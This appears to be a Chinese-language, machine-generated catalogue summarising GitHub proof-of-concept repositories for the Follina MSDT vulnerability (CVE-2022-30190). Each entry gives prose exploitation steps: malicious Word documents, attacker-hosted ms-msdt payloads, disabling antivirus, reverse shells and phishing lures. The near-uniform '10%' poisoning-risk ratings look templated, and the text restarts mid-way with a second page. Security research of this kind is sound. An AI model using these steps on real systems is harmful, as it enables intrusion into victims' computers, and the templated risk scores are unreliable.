该漏洞 (CVE-2022-30190)，又名Follina，是由于MSDT处理URL协议不当造成的远程代码执行漏洞。攻击者可以构造一个恶意的Word文档，其中包含指向远程HTTP服务器的链接。当用户打开文档时，Word会使用MSDT通过URL协议去请求远程HTML文件。这个HTML文件包含恶意的JavaScript代码，用于执行任意命令。

**有效性：** 提供的POC代码是有效的。该代码通过以下步骤利用漏洞：

1.  创建一个恶意的Word文档，其中包含指向攻击者控制的HTTP服务器的链接。
2.  托管一个HTTP服务器，该服务器提供包含恶意JavaScript代码的HTML文件。
3.  当受害者打开Word文档时，MSDT会尝试连接到攻击者的服务器并执行恶意代码。

**投毒风险：** 存在一定的投毒风险 (10%)。

*   `folina.py`脚本本身看起来是合法的漏洞利用代码，但需要仔细检查其依赖项和网络行为。
*   虽然主要功能集中在生成漏洞利用文件和搭建HTTP服务，但仍需审查脚本中是否存在任何潜在的恶意行为，例如未记录的数据传输或额外的文件操作。
*  脚本中从github下载`nc64.exe`，如果github上的文件被替换为恶意程序，则存在被投毒风险。

**利用方式：**

1.  攻击者创建一个恶意的Word文档 (`follina.doc`)，其中包含指向远程服务器上托管的HTML文件的链接。
2.  攻击者搭建一个HTTP服务器，托管包含恶意JavaScript代码的HTML文件 (`index.html`)。这个HTML文件使用`ms-msdt:`协议触发MSDT，并执行payload。
3.  攻击者诱骗受害者打开恶意的Word文档。
4.  Word文档加载远程HTML文件，触发MSDT，从而在受害者系统上执行任意代码。

POC代码使用python编写，主要步骤如下：

*   **环境准备:**
    *   搭建Windows虚拟机(推荐Win10 21H2)，并安装Microsoft Word 2013及Python 3.8.10。
    *   关闭Windows的病毒和威胁防护。
    *   使用`pip install netifaces`安装依赖。
*   **漏洞利用：**
    *   运行`folina.py`脚本，指定监听IP地址和端口。示例：`py folina.py -i <ip-address>`
    *   脚本会生成一个恶意的Word文档 (follina.doc)，并在指定的IP地址和端口上启动一个HTTP服务器。
    *   诱骗目标用户打开该Word文档，即可触发漏洞，执行计算器程序或反弹shell。

**项目地址:** [hycheng15/CVE-2022-30190](https://github.com/hycheng15/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #23

**来源**: [CVE-2022-30190-komomon_CVE-2022-30190-follina-Office-MSDT-Fixed.md](../2022/CVE-2022-30190-komomon_CVE-2022-30190-follina-Office-MSDT-Fixed.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，安装程序，查看、更改或删除数据，或在用户权限允许的上下文中创建新帐户

**影响版本:** 受影响的Windows版本：Windows 7 SP1, Windows 8.1, Windows Server 2008 R2 SP1, Windows Server 2012, Windows Server 2012 R2, Windows 10 (所有版本), Windows 11, Windows Server 2016, Windows Server 2019, Windows Server 2022。 具体版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开恶意的Word文档或其他调用MSDT的应用程序。攻击者需要诱骗用户执行恶意操作。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞。攻击者可以通过构造恶意的Word文档或其他调用MSDT的应用程序，利用URL协议调用MSDT来执行任意代码。该漏洞的利用方式是，恶意文档利用Word的远程模板功能从远程web服务器检索HTML文件，该HTML文件包含执行恶意代码的指令。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意链接的Word文档或其他可以调用MSDT的应用程序。
2.  该恶意链接指向攻击者控制的服务器，该服务器托管一个包含恶意代码的HTML文件。
3.  当受害者打开文档时，Word会尝试从远程服务器加载HTML文件。
4.  HTML文件利用ms-msdt协议触发MSDT，从而执行嵌入的恶意代码。
5.  恶意代码在受害者的计算机上执行，赋予攻击者控制受害者系统的能力。

**投毒风险分析：**

提供的Python POC代码主要功能是生成包含漏洞利用的恶意Word文档。 代码通过修改docx文档的`word/_rels/document.xml.rels`文件，将文档中的链接重定向到恶意服务器。  此外，代码还会修改`word/document.xml`添加OLEObject。

虽然代码本身实现了漏洞利用，但潜在的投毒风险主要在于以下几个方面：

*   **恶意服务器：**  POC代码依赖于攻击者控制的服务器来托管payload。 如果攻击者在服务器端放置了更具破坏性的payload，例如勒索软件或其他恶意软件，则利用此POC的用户可能会意外地分发这些恶意软件。
*   **生成的文档：**  生成的docx文档本身就是恶意文件。如果用户不小心将包含后门的恶意文档分享给其他人，可能会造成进一步的危害，但这不是代码投毒，而是漏洞本身的利用效果。

代码中直接包含恶意后门的概率较低，但用户需要警惕使用该POC可能带来的间接风险，尤其是payload服务器的安全性。 此处将投毒概率评估为10%，主要考虑的是payload服务器被恶意利用的可能性，而非代码本身存在后门。

**项目地址:** [komomon/CVE-2022-30190-follina-Office-MSDT-Fixed](https://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #24

**来源**: [CVE-2022-30190-mattjmillner_CVE-Smackdown.md](../2022/CVE-2022-30190-mattjmillner_CVE-Smackdown.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本（见漏洞库信息）

**利用条件:** 需要用户打开恶意文档（例如Word文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中。攻击者可以利用该漏洞通过调用应用程序(例如Microsoft Word)以URL协议的方式执行任意代码。攻击者通常会创建一个恶意的Word文档，该文档利用Word的远程模板功能从远程Web服务器检索一个HTML文件，该HTML文件包含恶意代码，从而触发MSDT执行任意命令。

**有效性:**
根据搜索结果，该漏洞是真实存在的，并且已被积极利用。漏洞库信息和搜索结果都确认了其存在和影响。

**投毒风险:**
提供的POC代码 `/tmp/64676d48ed786b898eab15332ce05bd0/README.md`  仅仅包含一个README.md文件，其中写着“Hello this is where we will conduct nefarious activities”。
这本身不是利用代码，而只是一个占位符。
因此，直接从这个`README.md`文件判断投毒是不可能的。该仓库如果包含其他恶意利用载荷则具有投毒可能。
投毒风险评估为10%，因为无法直接从提供的代码判断是否存在恶意代码，但说明该仓库可能用于恶意目的。

**利用方式:**
1.  攻击者创建一个包含恶意链接或嵌入对象的文档（例如Word文档）。
2.  当受害者打开该文档时，MSDT通过URL协议被调用。
3.  MSDT执行攻击者指定的恶意代码，从而导致远程代码执行。
4.  攻击者可以利用此漏洞安装程序，查看、更改或删除数据，或创建新帐户，具体取决于用户的权限。

**项目地址:** [mattjmillner/CVE-Smackdown](https://github.com/mattjmillner/CVE-Smackdown)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #25

**来源**: [CVE-2022-30190-melting0256_Enterprise-Cybersecurity.md](../2022/CVE-2022-30190-melting0256_Enterprise-Cybersecurity.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以执行任意代码，控制受影响的系统

**影响版本:** 受影响的Windows版本众多，详情见漏洞库信息

**利用条件:** 需要用户打开包含恶意链接或文件的应用程序（如Word）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过利用URL协议从调用应用程序（例如Word）调用MSDT来触发此漏洞。攻击者可以创建一个包含恶意链接或文件的应用程序（例如Word文档），当用户打开该文件时，MSDT将被调用并执行攻击者指定的任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC代码是有效的。搜索引擎结果中包含了大量关于此漏洞的分析、利用和修复信息，证明了该漏洞的真实性和危害性。提供的Python脚本（follina.py）能够生成包含恶意代码的Word文档，该文档在被打开时可以触发MSDT并执行攻击者指定的命令。

**投毒风险：**
POC代码中存在一定程度的投毒风险。虽然该代码的主要目的是为了验证漏洞的存在和利用方式，但攻击者可以很容易地修改该代码，使其包含恶意功能，例如：

1.  **恶意命令执行：** `command` 参数允许攻击者指定要在目标系统上执行的任意命令。如果用户不小心使用了包含恶意命令的POC代码，可能会导致系统受到损害。
2.  **反向Shell：** `--reverse` 参数允许攻击者在目标系统上创建一个反向Shell，从而可以远程控制该系统。这是一种非常危险的功能，可能会导致严重的安全问题。
3. **下载恶意可执行文件**: POC代码中会尝试从Github下载nc.exe，github连接可能会指向其他恶意地址，从而下载恶意可执行文件

综合来看，该POC代码的投毒风险约为10%，主要来自于可能被篡改的命令和潜在的恶意链接。

**利用方式：**
此漏洞的利用方式如下：

1.  **生成恶意Word文档：** 使用提供的Python脚本（follina.py）生成包含恶意链接的Word文档。该脚本会创建一个临时的HTTP服务器，用于托管一个包含MSDT协议处理程序的HTML文件。
2.  **诱骗用户打开文档：** 通过电子邮件、社交媒体或其他方式，诱骗目标用户打开恶意Word文档。
3.  **触发漏洞：** 当用户打开Word文档时，Word会尝试加载HTML文件。HTML文件中的MSDT协议处理程序会被触发，导致MSDT执行攻击者指定的命令。
4.  **执行任意代码：** 攻击者可以利用此漏洞在目标系统上执行任意代码，例如安装恶意软件、窃取敏感数据或控制系统。

总而言之，CVE-2022-30190是一个高危漏洞，攻击者可以利用它在受影响的系统上执行任意代码。用户应尽快采取必要的安全措施，例如安装补丁或禁用MSDT协议处理程序，以防止受到攻击。

**项目地址:** [melting0256/Enterprise-Cybersecurity](https://github.com/melting0256/Enterprise-Cybersecurity)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #26

**来源**: [CVE-2022-30190-michealadams30_Cve-2022-30190.md](../2022/CVE-2022-30190-michealadams30_Cve-2022-30190.md)

## CVE-2022-30190-Microsoft MSDT RCE-Follina

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码，控制系统。

**影响版本:** 见漏洞库信息

**利用条件:** 需要用户打开恶意构造的文档或点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个Microsoft Office漏洞，攻击者通过Word等程序调用MSDT，并利用URL协议从远程Web服务器检索HTML文件。该HTML文件包含恶意代码，从而在受害者系统上执行任意命令。漏洞利用涉及诱使用户打开恶意构造的文档（例如，通过电子邮件附件）。

**有效性：**
提供的Python POC代码看起来是有效的，它生成恶意文档或利用方式，并设置一个Web服务器来托管payload。代码包含从用户收集必要信息（如目标IP、端口、文件扩展名等）的部分，并创建所需的文件结构，表明具有利用该漏洞的能力。

**投毒风险：**
代码中可能存在投毒风险。虽然代码的主要功能是生成漏洞利用所需的文件，但攻击者可能在以下方面进行投毒：

*   **Web服务器payload：** 托管在Web服务器上的实际payload可能包含恶意代码，不仅执行预期的命令，还执行其他恶意操作，例如安装后门、窃取敏感信息等。
*   **生成的文档：**  生成的文档本身可能包含超出漏洞利用范围的恶意内容。

因此，存在一定风险，但代码整体结构看似为生成漏洞利用文件，投毒风险较低，预估投毒风险为10%。

**利用方式：**
1.  攻击者创建一个恶意构造的Word文档（或其他支持的文档类型）。
2.  该文档包含一个链接或引用，指向攻击者控制的Web服务器上的一个HTML文件。
3.  当用户打开该文档时，Word会尝试通过MSDT和URL协议检索该HTML文件。
4.  恶意HTML文件包含执行任意代码的payload。
5.  该payload在受害者系统上执行，从而允许攻击者控制系统。

**项目地址:** [michealadams30/Cve-2022-30190](https://github.com/michealadams30/Cve-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #27

**来源**: [CVE-2022-30190-seinab-ibrahim_Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis.md](../2022/CVE-2022-30190-seinab-ibrahim_Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis.md)

## CVE-2022-30190 (Follina) Microsoft MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本包括但不限于Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022

**利用条件:** 需要用户打开恶意构造的文档或URL，且MSDT需要被调用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。 

**有效性评估：**
根据漏洞库信息和搜索结果，此漏洞已得到确认，并且存在公开可用的PoC（Proof of Concept）代码。 搜索结果显示该漏洞被广泛讨论和利用，因此可以判断提供的PoC代码是有效的。 尽管提供的`README.md`文件仅仅是描述性的，但意味着完整的仓库中包含可利用的POC代码

**投毒风险分析：**
提供的漏洞利用代码只是一个 `README.md` 文件，主要描述了漏洞的分析和利用。 由于仅仅是描述性文件，无法从中直接判断是否存在投毒代码。但如果完整的仓库中存在其他恶意脚本，例如伪装成正常利用代码的后门，则存在投毒风险。根据文件内容，倾向于是一个教学和研究项目，投毒的可能性较低，因此判断投毒风险约为 10%。

**利用方式：**
1.  攻击者利用Microsoft Office (例如Word) 的远程模板功能。
2.  构造一个包含恶意链接的文档，该链接指向一个远程Web服务器。
3.  当用户打开该文档时，Word会从远程Web服务器检索HTML文件。
4.  该HTML文件包含恶意的MSDT协议URL，用于调用MSDT。
5.  MSDT被调用时，会执行攻击者预设的任意代码，从而实现远程代码执行。

**总结：**
CVE-2022-30190 (Follina) 是一个高危漏洞，利用简单，影响范围广。攻击者可以通过诱使用户打开恶意文档或URL来触发该漏洞。虽然提供的PoC文件本身不包含恶意代码，但仍需谨慎使用，并确保从可信来源获取完整的PoC代码。

**项目地址:** [seinab-ibrahim/Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis](https://github.com/seinab-ibrahim/Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #28

**来源**: [CVE-2022-30190-shri142_ZipScan.md](../2022/CVE-2022-30190-shri142_ZipScan.md)

## CVE-2022-30190 (Follina) MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本众多，具体版本范围请参考漏洞库信息

**利用条件:** 用户需要打开恶意构造的文档（如Word文档），或者点击恶意链接。调用程序（如Word）需要存在漏洞影响版本中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。当 MSDT 被调用应用程序（如 Word）使用 URL 协议调用时，就会出现此漏洞。攻击者可以构造恶意的 Word 文档，该文档利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。此 HTML 文件包含一个使用 `ms-msdt` 协议处理方案的恶意 JavaScript 代码，可以执行任意代码。

**漏洞利用方式:**
1.  攻击者创建一个包含恶意链接或嵌入恶意HTML的Word文档。
2.  受害者打开该文档。
3.  Word尝试从远程服务器加载HTML模板。
4.  远程HTML利用`ms-msdt`协议调用MSDT。
5.  MSDT执行HTML中嵌入的恶意代码，从而在受害者系统上执行任意命令。

**有效性:**
提供的代码是一个扫描器，用于检测文件中是否存在 Follina 漏洞。 它不是漏洞利用代码，而是用于分析文件是否包含该漏洞的特征。

**投毒风险:**
提供的 Go 代码主要功能是扫描文件，检测是否存在 CVE-2022-30190 (Follina) 漏洞的特征。代码本身包含一定的投毒风险的可能性，因为扫描器本身可能被利用来传播恶意文件，虽然扫描器本身功能没有直接执行恶意代码，但仍然存在潜在的风险：

1.  **依赖包风险:** 检查 `go.mod` 和 `go.sum` 文件，确认所有依赖包的来源是否可信，以及版本是否安全。恶意依赖包可能会引入漏洞或后门。
2.  **扫描逻辑缺陷:** 扫描逻辑中可能存在缺陷，导致误报或漏报。攻击者可能利用这些缺陷来隐藏恶意代码，绕过扫描器的检测。
3.  **供应链攻击:** 攻击者可能篡改代码仓库，在扫描器中植入恶意代码。用户下载并运行被篡改的扫描器后，可能会受到攻击。
4.  **代码执行环境风险:** 运行扫描器的环境可能存在安全漏洞。攻击者可能利用这些漏洞来提升权限，执行恶意代码。

虽然代码的主要目的是安全扫描，但由于软件开发和分发的复杂性，仍然存在一定的风险。使用者应当保持警惕，确保从可信的来源获取代码，并进行充分的安全审查。

风险评估：10% 风险可能性体现在扫描器可能被恶意利用或包含隐藏的漏洞，但主要功能是扫描而非攻击，因此投毒风险较低。

**项目地址:** [shri142/ZipScan](https://github.com/shri142/ZipScan)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #29

**来源**: [CVE-2022-30190-skitkat_CVE-2022-30190-POC.md](../2022/CVE-2022-30190-skitkat_CVE-2022-30190-POC.md)

## CVE-2022-30190 - Microsoft MSDT Follina 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可利用该漏洞在目标系统上执行任意代码

**影响版本:** 受影响的版本包括Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022等，具体版本范围见漏洞库信息。

**利用条件:** 需要用户打开包含恶意链接或文件的文档，例如Word文档。 或者通过其他调用程序触发MSDT。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。攻击者可以通过诱使用户打开特制的文档(例如Word文档)来触发该漏洞。该文档利用Word的远程模板功能从远程服务器检索HTML文件，其中包含恶意代码。当MSDT被调用并使用URL协议时，就会触发此漏洞，允许攻击者以调用应用程序的权限执行任意代码。这可能导致安装程序、查看/更改/删除数据或创建新帐户。

**漏洞利用方式：**
1.  攻击者创建一个包含恶意代码的Word文档或其他支持远程模板的文档。
2.  该文档包含一个指向攻击者控制的远程服务器的链接，该服务器托管一个包含恶意HTML代码的文件。
3.  当用户打开该文档时，Word会从远程服务器下载HTML文件。
4.  HTML文件中的恶意代码使用`ms-msdt:`协议调用MSDT，并传递恶意参数。
5.  MSDT解析恶意参数并执行攻击者指定的代码。

**有效性：**
根据搜索结果和漏洞库信息，该漏洞已被积极利用，并且存在公开的POC代码。
提供的Cargo.lock文件只是Rust项目的依赖锁文件，本身不包含漏洞利用代码，不能直接验证漏洞是否有效。但该文件表明该项目可能与该漏洞的利用有关，需要进一步分析项目源代码才能确定。

**投毒风险：**
Cargo.lock文件本身不包含可执行代码，因此直接通过该文件进行投毒的可能性较低。但是，如果该项目包含恶意构建脚本或者依赖了被投毒的第三方库，则可能存在投毒风险。初步判断该仓库存在一定比例的投毒风险，约10%，需要进一步分析项目源代码，检查是否存在以下情况：
*   构建脚本中是否包含恶意代码。
*   依赖项中是否存在已知被投毒的库。
*   是否存在其他可疑的文件或代码。

需要强调的是，在未对整个代码库进行彻底审查的情况下，无法完全排除投毒风险。

**项目地址:** [skitkat/CVE-2022-30190-POC](https://github.com/skitkat/CVE-2022-30190-POC)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #30

**来源**: [CVE-2022-30190-swaiist_CVE-2022-30190-Fix.md](../2022/CVE-2022-30190-swaiist_CVE-2022-30190-Fix.md)

## CVE-2022-30190-MSDT远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本，详见漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文件的文档

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190（又名Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中。攻击者可以利用此漏洞通过精心构造的恶意文档（例如Word文档）或通过URL协议调用MSDT来执行任意代码。当用户打开包含恶意链接或文件的文档时，该漏洞会被触发。根据搜索结果，攻击者利用Word的远程模板功能从远程服务器检索HTML文件，然后利用MSDT执行代码。提供的PoC代码中，execute.bat脚本首先备份 `HKEY_CLASSES_ROOT\ms-msdt` 注册表项到桌面上的`backup-for-msdt`文件中，然后删除该注册表项。restore.bat脚本则将备份的注册表项导入回来。这两个脚本本身并不会执行任何恶意代码，而是用于删除和恢复MSDT的注册表关联，通常是利用流程的一部分，用于绕过某些缓解措施或用于测试。因此，仓库本身提供的PoC代码没有发现作者隐藏的投毒代码。

**有效性：**
根据漏洞描述和搜索结果，以及PoC涉及的操作，该PoC代码是漏洞利用链的一部分，主要用于修改MSDT的注册表关联。结合其他步骤（例如，通过Word远程模板下载恶意HTML），可以实现远程代码执行。

**利用方式：**
1.  攻击者创建一个包含恶意链接或嵌入恶意OLE对象的文档（例如Word文档）。
2.  当用户打开文档时，Word会尝试从远程服务器加载HTML文件（通过远程模板功能）。
3.  恶意HTML文件利用`ms-msdt:` URL协议调用MSDT。
4.  MSDT被触发，执行HTML文件中包含的恶意代码。
5.  攻击者可以利用该漏洞在受害者系统上执行任意命令。  提供的PoC 代码中的`execute.bat` 通过删除`HKEY_CLASSES_ROOT\ms-msdt` 注册表关联，在恢复前，可能允许攻击者控制MSDT的行为或执行流程。`restore.bat`脚本用于恢复该关联，在攻击之后清理环境。

**投毒风险评估：**
PoC 代码本身主要用于注册表操作，没有发现明显的恶意代码。但是，由于PoC通常需要结合其他恶意文件（例如HTML或Word文档）才能完成攻击，因此，投毒风险主要存在于这些其他组件中。但是仅从提供的bat文件来判断，投毒风险较低。

**项目地址:** [swaiist/CVE-2022-30190-Fix](https://github.com/swaiist/CVE-2022-30190-Fix)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #31

**来源**: [CVE-2022-30190-winstxnhdw_CVE-2022-30190.md](../2022/CVE-2022-30190-winstxnhdw_CVE-2022-30190.md)

## CVE-2022-30190 (Follina) MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本包括Windows 7到Windows 11以及多个Windows Server版本，具体版本范围参考漏洞库信息。

**利用条件:** 需要用户打开包含恶意代码的文档（如Word文档），或者访问包含恶意链接的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以利用此漏洞，通过构造恶意的Word文档或其他方式，诱使用户打开，从而在用户系统上执行任意代码。 

**有效性评估：**

根据漏洞库信息和搜索结果，此漏洞在野外被广泛利用，POC代码的存在进一步证明了其有效性。提供的PoC代码描述了如何生成一个包含恶意链接的Word文档，当用户打开此文档时，MSDT会被调用，执行攻击者预先设定的恶意代码。

**投毒风险评估：**

分析提供的PoC代码，投毒风险较低，约为10%。主要风险点可能存在于以下几个方面：

1.  **init.py:** 该脚本用于构建恶意Word文档和初始化攻击者服务器。代码本身没有明显的恶意行为，但如果`build_payload`函数中的powershell命令被替换为更具破坏性的命令，则可能导致更严重的后果。
2.  **config.xml:** 该配置文件定义了攻击者服务器的主机名和端口。如果攻击者将此值更改为指向恶意服务器，则可能导致受害者下载和执行恶意软件。
3.  **build/href.txt:** 该文件包含用于触发漏洞的HTML代码。攻击者可能会修改此文件，以执行其他恶意操作。

但是，总体而言，提供的PoC代码主要用于演示漏洞，而不是用于传播恶意软件。 `destroy_all.bat`脚本的存在也一定程度上降低了风险，因为该脚本可以帮助用户删除所有相关文件。

**利用方式分析：**

1.  攻击者首先编辑`config.xml`，设置攻击者服务器的hostname和port。
2.  运行`dotnet publish LocalEXF`编译payload。
3.  运行`init.py`脚本，该脚本会：
    *   构建包含恶意链接的Word文档（trojan.docx）。
    *   在攻击者服务器上托管一个包含恶意Payload的HTML文件。
    *   base64 编码 PowerShell 命令。
4.  攻击者将此Word文档发送给受害者。
5.  受害者打开Word文档，MSDT会被调用，执行攻击者服务器上托管的Payload，从而在受害者系统上执行任意代码。

需要注意的是，要成功利用此漏洞，受害者需要卸载安全更新KB5016616，并且命令运行时间要短，否则会出现故障排除程序。


**项目地址:** [winstxnhdw/CVE-2022-30190](https://github.com/winstxnhdw/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #32

**来源**: [CVE-2022-30190-yeep1115_ICT287_CVE-2022-30190_Exploit.md](../2022/CVE-2022-30190-yeep1115_ICT287_CVE-2022-30190_Exploit.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本和Office版本见漏洞库信息

**利用条件:** 需要用户打开恶意Word文档

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT)中。攻击者可以利用此漏洞通过特制的Word文档，使用Word的远程模板功能从远程Web服务器检索HTML文件，从而在受害者系统上执行任意代码。

**有效性：** 根据漏洞信息、搜索结果和提供的POC代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个真实存在的、被广泛利用的漏洞。POC代码（虽然只是一个README.md文件）指向了一个实际的利用项目，说明了利用方式和受影响的系统版本，证明了漏洞的可利用性。

**投毒风险：** 分析提供的仓库内容，风险评估如下：

*   **README.md文件：** 本身不包含任何可执行代码，因此直接的投毒风险较低。
*   **外部链接：**  主要风险在于指向的`Hrishikesh7665/Follina_Exploiter_CLI`仓库。虽然原作者注明了License，但是仍然存在投毒的可能性。

综合分析，考虑到代码仓库可能存在恶意修改的风险，虽然直接投毒可能性较低，但间接风险不可忽视，因此评估投毒风险为10%。

**利用方式：** 漏洞的利用方式通常包括以下步骤：

1.  **构造恶意Word文档：** 攻击者创建一个包含恶意链接的Word文档。该链接指向一个由攻击者控制的远程Web服务器，并使用`ms-msdt:` URL协议调用MSDT。
2.  **诱骗受害者打开文档：** 攻击者通过电子邮件、社交媒体或其他方式将恶意文档发送给受害者。
3.  **执行恶意代码：** 当受害者打开文档时，Word会尝试从远程服务器检索HTML文件。该HTML文件包含恶意JavaScript代码，该代码利用MSDT执行任意命令。
4.  **控制系统：** 通过执行的命令，攻击者可以在受害者系统上安装恶意软件、窃取数据或执行其他恶意活动。

**项目地址:** [yeep1115/ICT287_CVE-2022-30190_Exploit](https://github.com/yeep1115/ICT287_CVE-2022-30190_Exploit)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #33

**来源**: [CVE-2022-30190-yrkuo_CVE-2022-30190.md](../2022/CVE-2022-30190-yrkuo_CVE-2022-30190.md)

# CVE-2022-30190

> 📦 该CVE有 **33** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-30190-AbdulRKB_Follina.md](../2022/CVE-2022-30190-AbdulRKB_Follina.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开恶意构造的文档（例如 Word 文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190 (Follina) 是一个 Microsoft Office 中的远程代码执行漏洞，当 MSDT 通过 URL 协议从调用应用程序（如 Word）调用时，会触发此漏洞。攻击者可以利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。该HTML文件中包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，从而执行任意命令。

**利用方式:**

1.  **恶意文档制作:** 攻击者创建一个恶意的 Word 文档，该文档包含指向远程 Web 服务器的链接，该服务器托管着包含恶意 JavaScript 代码的 HTML 文件。
2.  **HTTP服务器:** 攻击者搭建一个 HTTP 服务器，用于托管恶意的 HTML 文件，该文件利用 `ms-msdt:` 协议执行命令。
3.  **诱骗用户打开文档:** 攻击者通过鱼叉式网络钓鱼等方式诱骗受害者打开恶意 Word 文档。
